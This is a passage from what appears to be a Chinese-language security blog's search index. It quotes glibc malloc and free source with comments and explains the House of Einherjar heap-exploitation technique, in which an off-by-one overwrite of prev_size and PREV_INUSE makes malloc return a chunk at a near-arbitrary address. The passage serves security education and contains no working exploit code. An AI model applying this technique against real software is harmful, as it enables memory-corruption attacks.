&#123;</span><br><span class="line">              bck = victim-&gt;bk; //获取victim内存块的后向指针bck。</span><br><span class="line">    if (__glibc_unlikely (bck-&gt;fd != victim)) //如果bck的前向指针fd不指向victim，则链表已损坏。</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                  goto errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); //在victim内存块的适当偏移处设置“正在使用”位，以标记该内存块已被分配。</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;//更新small_bin和bck内存块的前向和后向指针，以维护双向链表的完整性。</span><br><span class="line"></span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="house-of-Einherjar"><a href="#house-of-Einherjar" class="headerlink" title="house_of_Einherjar"></a>house_of_Einherjar</h4><h5 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h5><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p><p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p><h5 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h5><p><code>free</code> 函数中的后向合并核心操作如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;<span class="comment">//检查前一块是否被使用</span></span><br><span class="line">    prevsize = prev_size(p);<span class="comment">//计算前一块的size</span></span><br><span class="line">    size += prevsize;<span class="comment">//获得当前块及上一块的大小和</span></span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));<span class="comment">//更新当前内存块的指针p，使其指向合并后的内存块的起始位置。</span></span><br><span class="line">    unlink(av, p, bck, fwd);<span class="comment">//进行unlink操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理如下：</p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241118151430177.png" alt="image-20241118151430177"></p><h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>这里我们就介绍该利用的原理。首先，在之前的堆的介绍中，我们可以知道以下的知识</p><ul><li>两个物理相邻的 chunk 会共享 <code>prev_size</code>字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 <code>prev_size</code> 字段。</li><li>一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。</li><li>后向合并时，新的 chunk 的位置取决于 <code>chunk_at_offset(p, -((long) prevsize))</code> 。</li></ul><p><strong>那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</strong></p><h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><img src="https://gitee.com/gery5sa/images/raw/master/image-20241118152742694.png" alt="image-20241118152742694" style="zoom: 33%;" /><p>这里我们假设 p0 堆块一方面可以写 prev_size 字段，另一方面，存在 off by one 的漏洞，可以写下一个 chunk 的 PREV_INUSE 部分，那么</p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241118153055884.png" alt="image-20241118153055884" style="zoom: 50%;" /><p>溢出以后</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
